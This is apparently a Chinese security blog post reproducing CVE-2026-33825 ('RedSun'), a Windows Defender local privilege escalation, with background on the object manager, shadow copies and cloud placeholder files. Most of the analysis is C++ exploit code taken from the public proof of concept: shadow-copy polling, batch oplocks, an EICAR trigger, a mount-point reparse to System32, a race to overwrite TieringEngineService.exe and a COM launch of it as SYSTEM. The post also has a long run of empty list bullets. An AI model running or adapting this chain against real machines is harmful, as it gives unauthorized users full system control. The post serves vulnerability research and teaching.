---
cve: "CVE-2026-33825"
source: "gelusus/wxvl 公众号漏洞文库"
---

#  【漏洞】RedSun复现  
原创 joe1sn
                        joe1sn  不止Sec   2026-05-03 12:41  
  
> CVE-2026-33825又名RedSun，Microsoft Defender 中访问控制粒度不足，允许获授权的攻击者在本地提升权限。[1]  
  
> 当 Windows Defender 识别出某个恶意文件带有“云标签”时，出于某种极其愚蠢且荒谬的原因，这款本该负责防护的杀毒软件竟然会自作聪明地决定：把刚刚发现的这个文件原封不动地重写回其原始位置。而这个 PoC 正是利用了这一反常行为，通过覆盖系统文件来获取管理员权限。[2]  
  
  
![image-20260502145007748](https://mmbiz.qpic.cn/mmbiz_png/bz5OjA3Rpu8EhdaoOzFbM28UWGH5s6DdvPElKzdNCyahGrib9Jn50f2loACzJwXKEGX1SMsbrMd2ibcoWFRU9lNNVibk4G8TbkMXDViaicQznzDE/640?wx_fmt=png&from=appmsg "")  
  
**PoC地址**  
- 原始PoC[1]:   
https://github.com/Nightmare-Eclipse/RedSun/  
  
- cmake的自制PoC:    
https://github.com/Joe1sn/CVE-2026-33825  
  
# 前置知识  
## Windows 对象管理器  
  
Windows 内核维护一个全局的  
**分层命名空间**  
，管理所有内核对象（设备、文件、事件、信号量等）。结构类似于文件系统：  
```
```  
  
这个命名空间存在于内核内存中，普通的   
CreateFile  
/  
FindFirstFile  
**完全访问不到**  
。必须通过   
NtOpenDirectoryObject  
 /   
NtQueryDirectoryObject  
 这些原生 API 才能查询。  
```
static std::vector<std::pair<std::wstring, std::wstring>> enum_directory(const std::wstring& path)
{
    std::vector<std::pair<std::wstring, std::wstring>> entries;

    UNICODE_STRING dirName;
    RtlInitUnicodeString(&dirName, path.c_str());

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &dirName, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

    HANDLE hDir = nullptr;
    NTSTATUS status = g_NtOpenDirectoryObject(&hDir, DIRECTORY_QUERY, &oa);
    if (status != 0) {
        std::cerr << "[-] Failed to open \\" << wstr_to_utf8(path.substr(1)) << ": 0x" << std::hex << status << std::dec << "\n";
        return entries;
    }

    BYTE buffer[sizeof(OBJECT_DIRECTORY_INFORMATION) + 512];
    ULONG context = 0;
    BOOLEAN restart = TRUE;

    for (;;) {
        ULONG returnLen = 0;
        status = g_NtQueryDirectoryObject(
            hDir, buffer, sizeof(buffer), TRUE, restart, &context, &returnLen);

        if (status == STATUS_NO_MORE_ENTRIES)
            break;

        if (!NT_SUCCESS(status) && status != STATUS_MORE_ENTRIES) {
            std::cerr << "[-] NtQueryDirectoryObject failed: 0x" << std::hex << status << std::dec << "\n";
            break;
        }

        restart = FALSE;
        auto info = reinterpret_cast<POBJECT_DIRECTORY_INFORMATION>(buffer);

        entries.emplace_back(
            std::wstring(info->Name.Buffer, info->Name.Length / sizeof(WCHAR)),
            std::wstring(info->TypeName.Buffer, info->TypeName.Length / sizeof(WCHAR)));
    }

    CloseHandle(hDir);
    return entries;
}
```  
  
![image-20260502204121740](https://mmbiz.qpic.cn/sz_mmbiz_png/bz5OjA3RpuibfnKOmDgxXu0KuibG1VGBT2EM1kpC2M2f3GpBXcuRnJrnoa7AIeTdIdvL0r9WicEsgUdWWaJdT1cicgT2SNsAmRTOsXkD9KUFiaD0/640?wx_fmt=png&from=appmsg "")  
## Volume Shadow Copy Service (Windows VSS)  
> Volume Shadow Copy Service（简称 VSS）是 Microsoft Windows 操作系统内置的数据备份框架，用于在应用程序运行时创建一致性的磁盘卷快照（shadow copy）。它支撑了系统还原、文件历史版本及多种备份软件，是 Windows 数据保护机制的核心组成部分。[3]  
  
  
在这里的利用就是首先就是windows defender检测到恶意文件的时候首先不会将其删除，而是会通过卷影副本进行隔离/备份操作。使用  
vssadmin  
可以操作。启用后会在对象管理器的  
Device  
下创建  
HarddiskVolumeShadowCopyN  
```
#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>

namespace fs = std::filesystem;

static std::string exec(const char* cmd)
{
    char buffer[4096];
    std::string result;
    FILE* pipe = _popen(cmd, "r");
    if (!pipe) return "[_popen failed]";

    while (fgets(buffer, sizeof(buffer), pipe))
        result += buffer;

    _pclose(pipe);
    return result;
}

static std::string extract_wmic_device_path(const std::string& output)
{
    // Try multiple known paths and return the last one (newest)
    std::vector<std::string> paths;
    std::string marker = "\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy";
    size_t pos = 0;

    while ((pos = output.find(marker, pos)) != std::string::npos) {
        // Scan back to find start of line (after '=' or start)
        size_t start = output.rfind('=', pos);
        if (start == std::string::npos) start = pos;
        else start = start + 1;

        size_t end = output.find_first_of("\r\n", start);
        std::string path = output.substr(start, end - start);

        // Trim trailing backslash
        while (!path.empty() && path.back() == '\\')
            path.pop_back();

        paths.push_back(path);
        pos = end;
    }

    if (paths.empty()) return {};
    return paths.back(); // newest
}

int main()
{
    fs::create_directories("C:\\test");

    const std::string targetFile = "C:\\test\\demo.txt";
    const std::string restoreFile = "C:\\test\\restored.txt";

    // 1. 使用wmi创建原始文件的VSS影子副本
    std::string output = exec("wmic shadowcopy call create Volume=\"C:\\\"");
    std::cout << "[+] Creating shadow copy via WMI: " << output << "\n";

    std::string shadowPath = extract_wmic_device_path(output);
    if (shadowPath.empty()) {
        std::cout << "[-] WMIC method failed.\n";
        std::cout << "===== Raw WMIC output =====\n" << output << "=====\n";

        // Fallback: try to list existing shadow copies
        std::cout << "[*] Trying to list existing shadow copies...\n";
        std::string listOutput = exec("wmic shadowcopy get DeviceObject /format:list 2>&1");
        shadowPath = extract_wmic_device_path(listOutput);
        if (shadowPath.empty()) {
            std::cout << "===== Existing shadow copies =====\n" << listOutput << "=====\n";
            std::cout << "[-] Cannot create or find any shadow copy.\n";
            return 1;
        }
        std::cout << "[+] Using existing shadow copy: " << shadowPath << "\n";
    }
    else {
        std::cout << "[+] Shadow Copy created: " << shadowPath << "\n";
    }

    // 2. 修改原始文件
    {
        std::ofstream ofs(targetFile);
        ofs << "MODIFIED DATA: This version is AFTER the shadow copy was taken.\n";
        ofs.close();
        std::cout << "[+] Original file modified (after snapshot).\n";
    }

    // 3. 从影子副本中恢复原始文件
    {
        std::string shadowFile = shadowPath + "\\test\\demo.txt";
        std::cout << "[+] Reading from snapshot: " << shadowFile << "\n";

        std::ifstream ifs(shadowFile, std::ios::binary);
        if (!ifs) {
            std::cerr << "[-] Cannot open file in shadow copy!\n";
            return 1;
        }

        std::ofstream ofs(restoreFile, std::ios::binary);
        ofs << ifs.rdbuf();
        ifs.close();
        ofs.close();
        std::cout << "[+] File restored to: " << restoreFile << "\n";
    }

    return 0;
}

```  
  
首先在  
C://test/  
中只存在  
demo.txt  
  
![image-20260502214442388](https://mmbiz.qpic.cn/mmbiz_png/bz5OjA3RpuibyBY6sxnTTFztYsPggib3UHFgjrDo64t8KazU7EkkHGSLEpRbUsM6oZYbeJgWZuLGibahCNMPsOm1FegehvfribuSib9985RRbQ8c/640?wx_fmt=png&from=appmsg "")  
  
在管理员模式下运行程序后，成功地从VSS中恢复了原始文件的内容。  
  
![image-20260502214610317](https://mmbiz.qpic.cn/sz_mmbiz_png/bz5OjA3Rpuic5gOl2M5FiaFiaROTrqZMyISV4E4hSibxW04M0Z7phM29hBb4JwnicESAhzDaj3YoCBHwpg8f4ze8mAs8eImicibqI58nTSjr5unuia0/640?wx_fmt=png&from=appmsg "")  
## 云同步目录  
> 从 Windows 10 版本 1709 开始，Windows 提供   
云文件 API  
。 此 API 由多个本机 Win32 和 WinRT API 组成，这些 API 正式支持云同步引擎，并处理创建和管理占位符文件和目录等任务。 此 API 的用户通常是同步提供程序，在某种程度上是 Windows 应用程序。[4]  
  
  
使用类似PoC中的代码创建云同步目录会发现由于占位符的存在，无法对其中的文件进行操作。  
  
![image-20260503202047072](https://mmbiz.qpic.cn/mmbiz_png/bz5OjA3RpuicKxbn7F012wVPiaHLhhlXgVukBDia5ymu3eMhnXfGyEGaPXwHickUfoicaDicyWGeR7CWTAJYEib3Xd42Q7gdYIiaLQiaEyc74VEcYNQM/640?wx_fmt=png&from=appmsg "")  
# PoC分析  
  
来源：  
https://github.com/Nightmare-Eclipse/RedSun/  
  
PoC主要替换掉了  
TieringEngineService  
这个服务，他是 Windows 里一个和  
**存储分层 / 数据分级（Storage Tiering）**  
相关的系统服务，名字直译就是“分层引擎服务”。  
## API简介  
- WaitOnAddress  
  
等待指定地址处的值更改。  
```
```  
  
- GetOverlappedResult  
  
检索指定文件、命名管道或通信设备上重叠操作的结果。  
```
```  
  
- FSCTL_SET_REPARSE_POINT IOCTL  
  
设置文件或目录上的重新分析点。  
```
```  
  
## 提前流程  
  
PoC的作者为了让利用更加简介，有如下代码  
```
bool IsRunningAsLocalSystem()
{

    HANDLE htoken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htoken)) {
        printf("OpenProcessToken failed, error : %d\n", GetLastError());
        return false;
    }
    TOKEN_USER* tokenuser = (TOKEN_USER*)malloc(MAX_SID_SIZE + sizeof(TOKEN_USER));
    DWORD retsz = 0;
    bool res = GetTokenInformation(htoken, TokenUser, tokenuser, MAX_SID_SIZE + sizeof(TOKEN_USER), &retsz);
    CloseHandle(htoken);
    if (!res)
        return false;
    bool ret = IsWellKnownSid(tokenuser->User.Sid, WinLocalSystemSid);
    if (ret) {
        LaunchConsoleInSessionId();
        ExitProcess(0);
    }
    return ret;
}
bool r = IsRunningAsLocalSystem();
```  
  
如果当前权限为system则开启conhost的cmd然后退出，不是的话就需要后续的提权操作。  
## 主流程  
### 1. 创建管道  
  
\??\pipe\REDSUN  
，新建文件夹  
%TEMP%\\RS-{随机UUID}  
，在这个临时文件夹下准备伪造文件的文件名  
TieringEngineService.exe  
- workdir =   
C:\Users\Alice\AppData\Local\Temp\RS-{4F320BF3-AB70-4B86-8ACF-07B112ED38B7}  
  
- filename=  
TieringEngineService.exe  
  
- foo=  
C:\Users\Alice\AppData\Local\Temp\RS-{4F320BF3-AB70-4B86-8ACF-07B112ED38B7}\TieringEngineService.exe  
  
- hfile = foo的句柄  
```
HANDLE hpipe = CreateNamedPipe(L"\\??\\pipe\\REDSUN", PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE, NULL, 1, NULL, NULL, NULL, NULL);
if (hpipe == INVALID_HANDLE_VALUE)
    return 1;

wchar_t workdir[MAX_PATH] = { 0 };
ExpandEnvironmentStrings(L"%TEMP%\\RS-", workdir, MAX_PATH);

GUID uid = { 0 };
wchar_t wuid[100] = { 0 };
CoCreateGuid(&uid);
StringFromGUID2(uid, wuid, 100);
wcscat(workdir, wuid);
wchar_t filename[] = L"TieringEngineService.exe";
wchar_t foo[MAX_PATH];
wsprintf(foo, L"%ws\\%ws", workdir, filename);

//...
//...

if (!CreateDirectory(workdir, NULL))
{
    printf("Failed to create workdir");
    return 1;
}
HANDLE hfile = CreateFile(foo, GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (hfile == INVALID_HANDLE_VALUE)
{
    printf("Failed create spoof work file.\n");
    return 1;
}

```  
  
  
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
### 2. 创建新的线程ShadowCopyFinderThread  
```
DWORD tid = 0;
HANDLE hthread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)ShadowCopyFinderThread, foo, NULL, &tid);
```  
  
2.1 初始化对象管理器扫描相关参数  
```
wchar_t devicepath[] = L"\\Device";
UNICODE_STRING udevpath = { 0 };
RtlInitUnicodeString(&udevpath, devicepath);
OBJECT_ATTRIBUTES objattr = { 0 };
InitializeObjectAttributes(&objattr, &udevpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
NTSTATUS stat = STATUS_SUCCESS;
HANDLE hobjdir = NULL;
stat = _NtOpenDirectoryObject(&hobjdir, 0x0001, &objattr);
if (stat)
{
    printf("Failed to open object manager directory, error : 0x%0.8X", stat);
    return 1;
}
bool criterr = false;
int vscnum = 0;
```  
  
2.2 标记已经存在的VSS ShadowCopy(  
HarddiskVolumeShadowCopy  
)  
```
wchar_t cmpstr[] = { L"HarddiskVolumeShadowCopy" };
if (objdirinfo[i].Name.Length >= sizeof(cmpstr))
{
    if (memcmp(cmpstr, objdirinfo[i].Name.Buffer, sizeof(cmpstr) - sizeof(wchar_t)) == 0)
    {
        (*vscnumber)++;
        if (LLVSScurrent)
        {
            LLVSScurrent->next = (LLShadowVolumeNames*)malloc(sizeof(LLShadowVolumeNames));
//...
            ZeroMemory(LLVSScurrent->next, sizeof(LLShadowVolumeNames));
            LLVSScurrent = LLVSScurrent->next;
            LLVSScurrent->name = (wchar_t*)malloc(objdirinfo[i].Name.Length + sizeof(wchar_t));
//...
            ZeroMemory(LLVSScurrent->name, objdirinfo[i].Name.Length + sizeof(wchar_t));
            memmove(LLVSScurrent->name, objdirinfo[i].Name.Buffer, objdirinfo[i].Name.Length);
        }
        else
        {
         //...
        }

    }
    //...
}
```  
  
2.3 疯狂重新遍历   
/Device  
 直到出现新的 VSS ShadowCopy(  
HarddiskVolumeShadowCopy  
)  
```
scanagain:
do
{
    //...
    stat = _NtQueryDirectoryObject(hobjdir, objdirinfo, reqsz, FALSE, restartscan, &scanctx, &retsz);
    //...
} while (1);
//...

ZeroMemory(emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION));
wchar_t newvsspath[MAX_PATH] = { 0 };
wcscpy(newvsspath, L"\\Device\\");

for (ULONG i = 0; i < ULONG_MAX; i++)
{
    if (memcmp(&objdirinfo[i], emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION)) == 0)
    {
        //...
        break;
    }
    if (_wcsicmp(L"Device", objdirinfo[i].TypeName.Buffer) == 0)
    {
        wchar_t cmpstr[] = { L"HarddiskVolumeShadowCopy" };
        if (objdirinfo[i].Name.Length >= sizeof(cmpstr))
        {
            if (memcmp(cmpstr, objdirinfo[i].Name.Buffer, sizeof(cmpstr) - sizeof(wchar_t)) == 0)
            {
                // check against the list if there this is a unique VS Copy
                LLShadowVolumeNames* current = vsinitial;
                bool found = false;
                while (current)
                {
                    if (_wcsicmp(current->name, objdirinfo[i].Name.Buffer) == 0)
                    {
                        found = true;
                        break;
                    }
                    current = current->next;
                }
                if (found)
                    continue;
                else
                {
                    srchfound = true;
                    wcscat(newvsspath, objdirinfo[i].Name.Buffer);
                    break;
                }
            }
        }
    }
}

if (!srchfound) {
    restartscan = true;
    goto scanagain;
}
```  
  
2.4 找到过后打开VSS中的文件对象，类似前置知识中的   
VSS-3. 从影子副本中恢复原始文件  
 部分，这里是使用  
NtCreateFile  
获得文件的句柄。这里的  
newvsspath  
和  
malpath  
就是VSS中的文件路径。然后对文件进行批处理机会锁  
FSCTL_REQUEST_OPLOCK_LEVEL_CACHE_HANDLE  
，这样处理成功后会通过  
ovd.hEvent  
进行通知。最后发射信号  
gevent  
后重置。当windows defender进行对VSS中的文件进行操作时会打破oplock，该线程通过  
GetOverlappedResult  
接收到，然后  
WaitForSingleObject  
开始阻塞wd对文件的操作。  
- hlk：VSS文件系统中的句柄，可能类似  
\Device\HarddiskVolumeShadowCopy6\%TEMP%\RS-{UUID}\TieringEngineService.exe  
。  
  
```
    wchar_t malpath[MAX_PATH] = { 0 };
    wcscpy(malpath, newvsspath);
    wcscat(malpath, &foo[2]);
    UNICODE_STRING _malpath = { 0 };
    RtlInitUnicodeString(&_malpath, malpath);
    OBJECT_ATTRIBUTES objattr2 = { 0 };
    InitializeObjectAttributes(&objattr2, &_malpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    IO_STATUS_BLOCK iostat = { 0 };
    HANDLE hlk = NULL;
retry:
    stat = NtCreateFile(&hlk, DELETE | SYNCHRONIZE, &objattr2, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, NULL, FILE_OPEN, NULL, NULL, NULL);
    if (stat == STATUS_NO_SUCH_DEVICE)
        goto retry;
    if (stat)
    {
        printf("Failed to open file, error : 0x%0.8X\n", stat);
        return 1;
    }
    printf("The sun is shinning...\n");

    OVERLAPPED ovd = { 0 };
    ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
    DeviceIoControl(hlk, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL, NULL, NULL, NULL, &ovd);
    if (GetLastError() != ERROR_IO_PENDING)
    {
        printf("Failed to request a batch oplock on the update file, error : %d", GetLastError());
        return 0;
    }
    DWORD nbytes = 0;
    SetEvent(gevent);
    ResetEvent(gevent);
    GetOverlappedResult(hlk, &ovd, &nbytes, TRUE);
    WaitForSingleObject(gevent, INFINITE);
```  
### 3. 向伪造的文件写入云恶意标签  
```
char eicar[] = "*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP\\4[PA@%P!O5X";
rev(eicar);
DWORD nwf = 0;
WriteFile(hfile, eicar, sizeof(eicar) - 1, &nwf, NULL);

// trigger AV response
CreateFile(foo, GENERIC_READ | FILE_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
```  
### 4.wd扫描后  
  
恶意软件扫描到标签后，接收到来自  
ShadowCopyFinderThread  
的  
gevent  
，说明wd准备恢复文件。修改文件属性为：当hFile这个句柄关闭时删除源文件。其实就是删除原有的  
TieringEngineService.exe  
，然后修改文件夹属性为云同步文件夹，并且创建  
TieringEngineService.exe  
占位符（这样此刻的windows defender依旧无法从VSS写回）。然后再通知  
ShadowCopyFinderThread  
这边修改完成。  
```
if (WaitForSingleObject(gevent, 120000) != WAIT_OBJECT_0)
{
    printf("PoC timed out, is real time protection enabled ?");
    return 1;
}

IO_STATUS_BLOCK iostat = { 0 };
FILE_DISPOSITION_INFORMATION_EX fdiex = { 0x00000001 | 0x00000002 };
_NtSetInformationFile(hfile, &iostat, &fdiex, sizeof(fdiex), (FILE_INFORMATION_CLASS)64);
CloseHandle(hfile);
DoCloudStuff(workdir, filename, sizeof(eicar) - 1);

OVERLAPPED ovd = { 0 };
ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);

SetEvent(gevent);
```  
  
![image-20260503171952696](https://mmbiz.qpic.cn/mmbiz_png/bz5OjA3RpuicqVUJ5Y4OcN3ZaDWmA7FiaZsDCOV4D2X1eZJY3frAmm2sbXLf33nTakZa5yQPlsoUu7LY18PTo26IszFuROyQbIQyrUaYVKjMQ/640?wx_fmt=png&from=appmsg "")  
  
![image-20260503172004226](https://mmbiz.qpic.cn/sz_mmbiz_png/bz5OjA3RpuicgEgZ5EicIDELfNdD5sCPGcDPCGUibSvCh6dcl9uib3vIUpSzRcJ11Vv6Kj33ZAc5WFRwQrGWPkBkmm3X03UoVKTMfnzKRYt87Ik/640?wx_fmt=png&from=appmsg "")  
  
![image-20260503172235986](https://mmbiz.qpic.cn/mmbiz_png/bz5OjA3Rpu9icf4oG6JLh4ypOOgQyT3wXgyeJ35OY212KhJMwd4h95UcRGRKvxDrkgqfA6QsORzBn5y1zW5W1n4CxX3OYiaRjDA30x51PRqt0/640?wx_fmt=png&from=appmsg "")  
### 5. 唤醒主线程  
  
ShadowCopyFinderThread  
收到后(接2.4)，通过  
WakeByAddressAll  
唤醒等待gEvent改变的主线程，最后修饰退出  
```
```  
### 6. 重建文件夹  
  
将就文件夹移动至  
.TMP  
结尾，然后重新创建文件夹。  
- ntfoo:   
\??\C:\Users\Alice\AppData\Local\Temp\RS-{4F320BF3-AB70-4B86-8ACF-07B112ED38B7}\TieringEngineService.exe  
，适用于NtCreateFile的格式。  
  
- _foo: ntfoo的UniCode格式。  
  
- _tmp:   
\??\C:\Users\Alice\AppData\Local\Temp\RS-{4F320BF3-AB70-4B86-8ACF-07B112ED38B7}.TMP  
  
使用  
NtCreateFile  
造出一个全新的   
TieringEngineService.exe  
 文件，该文件只能被读取，同时用  
DeviceIoControl  
上oplock再次探测是否对这个文件进行操作。然后再  
GetOverlappedResult  
上等待。  
```
NTSTATUS stat;
wchar_t ntfoo[MAX_PATH] = { L"\\??\\" };
wcscat(ntfoo, foo);
UNICODE_STRING _foo = { 0 };
RtlInitUnicodeString(&_foo, ntfoo);
OBJECT_ATTRIBUTES _objattr = { 0 };
InitializeObjectAttributes(&_objattr, &_foo, OBJ_CASE_INSENSITIVE, NULL, NULL);

wchar_t _tmp[MAX_PATH] = { 0 };
wsprintf(_tmp, L"\\??\\%s.TMP", workdir);
MoveFileEx(workdir, _tmp, MOVEFILE_REPLACE_EXISTING);
if (!CreateDirectory(workdir, NULL))
    //...
LARGE_INTEGER fsz = { 0 };
fsz.QuadPart = 0x1000;
stat = NtCreateFile(&hfile, FILE_READ_DATA | DELETE | SYNCHRONIZE, &_objattr, &iostat, &fsz, FILE_ATTRIBUTE_READONLY, FILE_SHARE_READ, FILE_SUPERSEDE, NULL, NULL, NULL);
    //...
DeviceIoControl(hfile, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL, NULL, NULL, NULL, &ovd);
    //...
GetOverlappedResult(hfile, &ovd, &nbytes, TRUE);
```  
  
![image-20260503190748268](https://mmbiz.qpic.cn/mmbiz_png/bz5OjA3Rpu9zpT1BggZgv4uMtarNTZ6j0PPNFXc7BPCicmGWjAXQdk4k95xibkOBaIwImATE4GkTqEVbwXQ8Pa9QSWHwHficF72QULwvqPGYy0/640?wx_fmt=png&from=appmsg "")  
### 7. 再次oplock  
  
在等待再次访问exe的时候将文件映射到内存（只读），如果要写入的话会失败。通过文件映射固定住文件数据区，确保在 oplock 等待期间文件不会被系统回收；oplock 触发后立即释放，为后面的重命名+删除操作腾路。  
- _tmp:   
\??\C:\Users\Alice\AppData\Local\Temp\RS-{4F320BF3-AB70-4B86-8ACF-07B112ED38B7}.TMP2  
  
- _rp:   
\??\C:\Users\Alice\AppData\Local\Temp\RS-{4F320BF3-AB70-4B86-8ACF-07B112ED38B7}\TieringEngineService.exe  
  
- _usrp: _rp的UniCode版本  
  
- hfile:   
C:\Users\Alice\AppData\Local\Temp\RS-{4F320BF3-AB70-4B86-8ACF-07B112ED38B7}\TieringEngineService.exe  
 的旧句柄。  
  
两次  
_NtSetInformationFile  
，把文件从   
RS-{GUID}\TieringEngineService.exe  
 改名到   
RS-{GUID}.TEMP2  
，然后设置源文件（不带TMP文件夹下的）关闭handle后删除。  
  
然后打开  
C:\Users\Alice\AppData\Local\Temp\RS-{4F320BF3-AB70-4B86-8ACF-07B112ED38B7}  
文件夹的句柄  
```
HANDLE hmap = CreateFileMapping(hfile, NULL, PAGE_READONLY, NULL, NULL, NULL);
void* mappingaddr = MapViewOfFile(hmap, PAGE_READONLY, NULL, NULL, NULL);

DWORD nbytes = 0;
GetOverlappedResult(hfile, &ovd, &nbytes, TRUE);
UnmapViewOfFile(mappingaddr);
CloseHandle(hmap);

{
    wchar_t _tmp[MAX_PATH] = { 0 };
    wsprintf(_tmp, L"\\??\\%s.TEMP2", workdir);

    PFILE_RENAME_INFORMATION pfri = (PFILE_RENAME_INFORMATION)malloc(sizeof(FILE_RENAME_INFORMATION) + (sizeof(wchar_t) * wcslen(_tmp)));
    ZeroMemory(pfri, sizeof(FILE_RENAME_INFORMATION) + (sizeof(wchar_t) * wcslen(_tmp)));
    pfri->ReplaceIfExists = TRUE;
    pfri->FileNameLength = (sizeof(wchar_t) * wcslen(_tmp));
    memmove(&pfri->FileName[0], _tmp, (sizeof(wchar_t) * wcslen(_tmp)));
    stat = _NtSetInformationFile(hfile, &iostat, pfri, sizeof(FILE_RENAME_INFORMATION) + (sizeof(wchar_t) * wcslen(_tmp)), (FILE_INFORMATION_CLASS)10);
    _NtSetInformationFile(hfile, &iostat, &fdiex, sizeof(fdiex), (FILE_INFORMATION_CLASS)64);
}

wchar_t _rp[MAX_PATH] = { L"\\??\\" };
wcscat(_rp, workdir);
UNICODE_STRING _usrp = { 0 };
RtlInitUnicodeString(&_usrp, _rp);
InitializeObjectAttributes(&_objattr, &_usrp, OBJ_CASE_INSENSITIVE, NULL, NULL);
HANDLE hrp = NULL;
stat = NtCreateFile(&hrp, FILE_WRITE_DATA | DELETE | SYNCHRONIZE, &_objattr, &iostat, NULL, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN_IF, FILE_DIRECTORY_FILE | FILE_DELETE_ON_CLOSE, NULL, NULL);
//...
```  
  
![image-20260503191706924](https://mmbiz.qpic.cn/sz_mmbiz_png/bz5OjA3Rpu8nkpRWX1EJU428LprRrgttycu9btwPbBnRfIHo3zj0ba72jOILrveu0wO0cjlz8svKM9xf4d5vzdaqPBdXcV1H3ibmJia5Tpib0c/640?wx_fmt=png&from=appmsg "")  
### 8. 修改文件夹属性为重定向  
```
wchar_t rptarget[] = { L"\\??\\C:\\Windows\\System32" };
DWORD targetsz = wcslen(rptarget) * 2;
DWORD printnamesz = 1 * 2;
DWORD pathbuffersz = targetsz + printnamesz + 12;
DWORD totalsz = pathbuffersz + REPARSE_DATA_BUFFER_HEADER_LENGTH;
REPARSE_DATA_BUFFER* rdb = (REPARSE_DATA_BUFFER*)HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS | HEAP_ZERO_MEMORY, totalsz);
rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
rdb->ReparseDataLength = static_cast<USHORT>(pathbuffersz);
rdb->Reserved = NULL;
rdb->MountPointReparseBuffer.SubstituteNameOffset = NULL;
rdb->MountPointReparseBuffer.SubstituteNameLength = static_cast<USHORT>(targetsz);
memcpy(rdb->MountPointReparseBuffer.PathBuffer, rptarget, targetsz + 2);
rdb->MountPointReparseBuffer.PrintNameOffset = static_cast<USHORT>(targetsz + 2);
rdb->MountPointReparseBuffer.PrintNameLength = static_cast<USHORT>(printnamesz);
memcpy(rdb->MountPointReparseBuffer.PathBuffer + targetsz / 2 + 1, rptarget, printnamesz);

DWORD ret = DeviceIoControl(hrp, FSCTL_SET_REPARSE_POINT, rdb, totalsz, NULL, NULL, NULL, NULL);
HeapFree(GetProcessHeap(), NULL, rdb);
```  
  
![image-20260503193103091](https://mmbiz.qpic.cn/mmbiz_png/bz5OjA3RpuibswW4ScSRnibhLZfIKASb8xa12Revaw5bsqvBlbtEbIib4BC8X5sPaQJg5FObI5y5akcNkzZNhyezWTYAsllx303ic8feqicbR0GI/640?wx_fmt=png&from=appmsg "")  
### 9. 写入文件到System32  
  
首先关闭hFile的句柄导致之前的".TMP2"的文件删除，然后同windows defender进行竞争，竞争成功时拿到System32目录下  
TieringEngineService.exe  
的  
GENERIC_WRITE  
权限句柄，然后通过  
GetModuleHandle  
和  
GetModuleFileName  
拿到自身路径(mx1)，将自身通过句柄复制到System32下(mx2)，这个时候的  
TieringEngineService  
服务就是我们的代码了。最后通过COM启动原本属于  
TieringEngineService  
的服务，只是使用的System权限来运行我们的程序。  
  
**注意**  
，此时的hPipe依旧存在，system权限运行的这个程序会连接到这个旧的namedpipe(1.创建管道部分)中。  
```
CloseHandle(hfile);

HANDLE hlk = NULL;
for (int i = 0; i < 1000; i++)
{
    wchar_t malpath[] = { L"\\??\\C:\\Windows\\System32\\TieringEngineService.exe" };
    UNICODE_STRING _malpath = { 0 };
    RtlInitUnicodeString(&_malpath, malpath);
    OBJECT_ATTRIBUTES objattr2 = { 0 };
    InitializeObjectAttributes(&objattr2, &_malpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    IO_STATUS_BLOCK iostat = { 0 };
    stat = NtCreateFile(&hlk, GENERIC_WRITE, &objattr2, &iostat, NULL, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_SUPERSEDE, NULL, NULL, NULL);
    if (!stat)
        break;
    Sleep(20);
}

if (stat != STATUS_SUCCESS)
{
    printf("Something went wrong.\n");
    return 1;
}
printf("The red sun shall prevail.\n");

CloseHandle(hlk);
CloseHandle(hrp);

wchar_t mx[MAX_PATH] = { 0 };
GetModuleFileName(GetModuleHandle(NULL), mx, MAX_PATH);
wchar_t mx2[MAX_PATH] = { 0 };
ExpandEnvironmentStrings(L"%WINDIR%\\System32\\TieringEngineService.exe", mx2, MAX_PATH);
CopyFile(mx, mx2, FALSE);
LaunchTierManagementEng();
Sleep(2000);
CloseHandle(hpipe);

return 0;

/////////
void LaunchTierManagementEng()
{
    CoInitialize(NULL);
    GUID guidObject = { 0x50d185b9,0xfff3,0x4656,{0x92,0xc7,0xe4,0x01,0x8d,0xa4,0x36,0x1d} };
    void* ret = NULL;
    HRESULT hr = CoCreateInstance(guidObject, NULL, CLSCTX_LOCAL_SERVER, guidObject, &ret);


    CoUninitialize();
}
```  
  
![image-20260503201634838](https://mmbiz.qpic.cn/sz_mmbiz_png/bz5OjA3RpuibG1n5TKYktpVQnt9fSQiblbWWicf9G5GqVXByN97D0qpBXOUSwqgx69JicM9HibhgfM6Mct7YstiadV2JT7jkE0jCrpqPH2z29iap8c/640?wx_fmt=png&from=appmsg "")  
# 应用  
  
[1]   
https://nvd.nist.gov/vuln/detail/CVE-2026-33825  
  
[2]   
https://github.com/Nightmare-Eclipse/RedSun/  
  
[3]   
https://learn.microsoft.com/zh-cn/windows-server/storage/file-server/volume-shadow-copy-service  
  
[4]   
